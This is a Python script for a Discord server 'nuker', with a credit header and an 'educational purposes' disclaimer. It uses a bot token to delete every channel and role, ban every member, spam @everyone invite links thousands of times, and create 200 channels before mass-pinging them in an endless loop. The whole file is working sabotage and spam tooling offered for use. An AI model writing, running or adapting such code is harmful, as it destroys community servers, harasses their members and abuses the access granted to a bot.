# made by Skypop AKA Akshat
#version : 1V
#discord: https://discord.gg/kNYcKDfcCx
#Always give credit to me if you use this code
#This code is only for educational purposes
#I am not responsible for any damage caused by this code

#this nuker is not maintain anymore because the new version is launched. It's name is RADIUM.
#RADIUM is a new version of this nuker. It is more powerful and more stable than this nuker.
#link - https://github.com/akshat4codez/RADIUM

import json
import time
import asyncio
import aiohttp

def load_config():
    with open('config.json', 'r') as file:
        return json.load(file)

config = load_config()
token = config['TOKEN']
guild_id = config['guild_id']
prefix = config.get('prefix')

base_url = "https://discord.com/api/v10"
headers = {
    "Authorization": f"Bot {token}",
    "Content-Type": "application/json"
}

banner = r"""
 $$$$$$\  $$\                                           $$\                            
$$  __$$\ $$ |                                          $$ |                           
$$ /  \__|$$ |  $$\ $$\   $$\       $$$$$$$\  $$\   $$\ $$ |  $$\  $$$$$$\   $$$$$$\  
\$$$$$$\  $$ | $$  |$$ |  $$ |      $$  __$$\ $$ |  $$ |$$ | $$  |$$  __$$\ $$  __$$\ 
 \____$$\ $$$$$$  / $$ |  $$ |      $$ |  $$ |$$ |  $$ |$$$$$$  / $$$$$$$$ |$$ |  \__|
$$\   $$ |$$  _$$<  $$ |  $$ |      $$ |  $$ |$$ |  $$ |$$  _$$<  $$   ____|$$ |      
\$$$$$$  |$$ | \$$\ \$$$$$$$ |      $$ |  $$ |\$$$$$$  |$$ | \$$\ \$$$$$$$\ $$ |      
 \______/ \__|  \__| \____$$ |      \__|  \__| \______/ \__|  \__| \_______|\__|      
                    $$\   $$ |                                                        
                    \$$$$$$  |                                                        
                     \______/                                                         
"""

print(banner)


async def fetch_with_rate_limit_handling(session, method, url, **kwargs):
    while True:
        async with session.request(method, url, **kwargs) as response:
            if response.status == 429:
                retry_after = int(response.headers.get("Retry-After", 1))
                print(f"Rate limited. Retrying after {retry_after} seconds...")
                await asyncio.sleep(retry_after)
            else:
                if response.content_type == "application/json":
                    return await response.json(), response.status
                return {}, response.status


async def get_bot_info():
    async with aiohttp.ClientSession(headers=headers) as session:
        url = f"{base_url}/users/@me"
        bot_info, status = await fetch_with_rate_limit_handling(session, 'GET', url)
        if status == 200:
            print(f"Logged in as {bot_info['username']} (ID: {bot_info['id']})")
            print("bot prefix is", prefix)
        else:
            print(f"Failed to fetch bot info: {status}")


async def send_message(message, channel_id=None):
    async with aiohttp.ClientSession(headers=headers) as session:
        if channel_id == "all":
 
            url = f"{base_url}/guilds/{guild_id}/channels"
            channels, status = await fetch_with_rate_limit_handling(session, 'GET', url)
            if status == 200:
                tasks = []
                for channel in channels:
                    if channel['type'] == 0: 
                        tasks.append(send_message_to_channel(session, channel['id'], message))
                await asyncio.gather(*tasks)
            else:
                print(f"Failed to fetch channels: {status}")
        else:
            await send_message_to_channel(session, channel_id, message)

async def send_message_to_channel(session, channel_id, message):
    url = f"{base_url}/channels/{channel_id}/messages"
    payload = {"content": message}
    _, status = await fetch_with_rate_limit_handling(session, 'POST', url, json=payload)
    if status == 200:
        print(f"Message sent successfully to channel {channel_id}")
    else:
        print(f"Failed to send message to channel {channel_id}: {status}")
    

async def create_channels(channel_name, channel_type=0, count=1):
    async with aiohttp.ClientSession(headers=headers) as session:
        tasks = []
        for i in range(count):
            tasks.append(create_channel(session, f"{channel_name}-{i+1}", channel_type))
        await asyncio.gather(*tasks)

async def create_channel(session, channel_name, channel_type=0):
    url = f"{base_url}/guilds/{guild_id}/channels"
    payload = {"name": channel_name, "type": channel_type}
    _, status = await fetch_with_rate_limit_handling(session, 'POST', url, json=payload)
    if status == 201:
        print(f"Channel '{channel_name}' created successfully.")
    else:
        print(f"Failed to create channel '{channel_name}': {status}")

async def delete_all_channels():
    async with aiohttp.ClientSession(headers=headers) as session:
        url = f"{base_url}/guilds/{guild_id}/channels"
        channels, status = await fetch_with_rate_limit_handling(session, 'GET', url)
        if status == 200:
            tasks = []
            for channel in channels:
                tasks.append(delete_channel(session, channel['id'], channel['name']))
            await asyncio.gather(*tasks)
        else:
            print(f"Failed to fetch channels: {status}")

async def delete_channel(session, channel_id, channel_name):
    url = f"{base_url}/channels/{channel_id}"
    _, status = await fetch_with_rate_limit_handling(session, 'DELETE', url)
    if status in [200, 204]:
        print(f"Deleted channel: {channel_name} (ID: {channel_id})")
    else:
        print(f"Failed to delete channel {channel_name} (ID: {channel_id}): {status}")

async def fetch_all_members(session):
    url = f"{base_url}/guilds/{guild_id}/members?limit=1000"
    members, status = await fetch_with_rate_limit_handling(session, 'GET', url)
    if status == 200:
        return members
    else:
        print(f"Failed to fetch members: {status}")
        return []

async def ban_member(session, member_id):
    url = f"{base_url}/guilds/{guild_id}/bans/{member_id}"
    _, status = await fetch_with_rate_limit_handling(session, 'PUT', url)
    if status in [200, 201, 204]:
        print(f"Banned member: {member_id}")
    else:
        print(f"Failed to ban member {member_id}: {status}")

async def ban_all():
    async with aiohttp.ClientSession(headers=headers) as session:
        members = await fetch_all_members(session)
        if members:
            tasks = []
            for member in members:
                tasks.append(ban_member(session, member['user']['id']))
            await asyncio.gather(*tasks)
            
async def count_channels():
    async with aiohttp.ClientSession(headers=headers) as session:
        url = f"{base_url}/guilds/{guild_id}/channels"
        channels, status = await fetch_with_rate_limit_handling(session, 'GET', url)
        if status == 200:
            print(f"The server has {len(channels)} channels.")
        else:
            print(f"Failed to fetch channels: {status}")

async def invite_spam_all(count=1000):
    async with aiohttp.ClientSession(headers=headers) as session:
        url = f"{base_url}/guilds/{guild_id}/channels"
        channels, status = await fetch_with_rate_limit_handling(session, 'GET', url)
        
        if status == 200:
            invite_url1 = "https://discord.gg/drontop"
            invite_url2 = "https://discord.gg/kNYcKDfcCx"
            message = "@everyone Skypop /  Akshat nuker is here"
            message += f" {invite_url1} {invite_url2}"

            for channel in channels:
                if channel['type'] == 0:  
                    for _ in range(count):
                        payload = {"content": message}
                        _, status = await fetch_with_rate_limit_handling(session, 'POST', f"{base_url}/channels/{channel['id']}/messages", json=payload)
                        
                        if status == 200:
                            print(f"Message and invites sent to channel {channel['id']}")
                        else:
                            print(f"Failed to send to channel {channel['id']}: {status}")
        else:
            print(f"Failed to fetch channels: {status}")

async def main():
    count = int(input("How many times would you like to spam the invites in each channel? "))
    await invite_spam_all(count)
    
async def massping():
    await create_channels(" SKYNUKER", count=200)
    while True:
        async with aiohttp.ClientSession(headers=headers) as session:
            url = f"{base_url}/guilds/{guild_id}/channels"
            channels, status = await fetch_with_rate_limit_handling(session, 'GET', url)

            if status == 200:
                message = "@everyone ! ĐⱤ x Skypop / ! ĐⱤ x Akshat nuker is here"
                text_channels = [channel for channel in channels if channel['type'] == 0]
                tasks = []
                for channel in text_channels:
                    tasks.append(send_message_to_channel(session, channel['id'], message))
                await asyncio.gather(*tasks)
            else:
                print(f"Failed to fetch channels: {status}")
        await asyncio.sleep(1)
        
async def delete_all_roles():
    async with aiohttp.ClientSession(headers=headers) as session:
        url = f"{base_url}/guilds/{guild_id}/roles"
        roles, status = await fetch_with_rate_limit_handling(session, 'GET', url)
        
        if status == 200:
            tasks = []
            for role in roles:
                if role['name'] != "@everyone":
                    tasks.append(delete_role(session, role['id'], role['name']))
            await asyncio.gather(*tasks)
        else:
            print(f"Failed to fetch roles: {status}")

async def delete_role(session, role_id, role_name):
    url = f"{base_url}/guilds/{guild_id}/roles/{role_id}"
    _, status = await fetch_with_rate_limit_handling(session, 'DELETE', url)
    if status in [200, 204]:
        print(f"Deleted role: {role_name} (ID: {role_id})")
    else:
        print(f"Failed to delete role {role_name} : {status} It can be solve if you put the bot above the all roles")

async def main():
    while True:
        print("\nDiscord Bot Command Menu")
        print("[1] - Fetch Bot Info")
        print("[2] - Send Message to a Channel or All Channels")
        print("[3] - Create Multiple Channels")
        print("[4] - Delete All type of Channels")
        print("[5] - Ban All")
        print("[6] - Count Channels")
        print("[7] - Invite Spam")
        print("[8] - Mass Ping")
        print("[9] - Role delete")
        print("[10] - Exit")

        choice = input("\nEnter your choice: ")

        if choice == "1":
            await get_bot_info()
        elif choice == "2":
            channel_id = input("Enter the channel ID (or type 'all' for all channels): ")
            message = input("Enter the message: ")
            await send_message(message, channel_id)
        elif choice == "3":
            channel_name = input("Enter the base name for the channels: ")
            count = int(input("Enter how many channels to create: "))
            channel_type = int(input("Enter channel type (0 for text, 2 for voice): "))
            await create_channels(channel_name, channel_type, count)
        elif choice == "4":
            confirm = input("Are you sure you want to delete all channels? (y/n): ")
            if confirm.lower() == "y":
                await delete_all_channels()
            else:
                print("Operation canceled.")
        elif choice == "5":
            confirm = input("Are you sure you want to ban all members? (y/n): ")
            if confirm.lower() == "y":
                await ban_all()
        elif choice == "6":  
            await count_channels()
        elif choice == "7":
            count = int(input("How many times would you like to spam the invites in each channel? "))
            await invite_spam_all(count)
        elif choice == "8":
            await massping()
        elif choice == "9":
            confirm = input("Are you sure you want to delete all roles? (y/n): ")
            if confirm.lower() == "y":
                await delete_all_roles()
            else:
                print("Operation canceled.")
        elif choice == "10":
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please try again.")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nProgram terminated by user.")
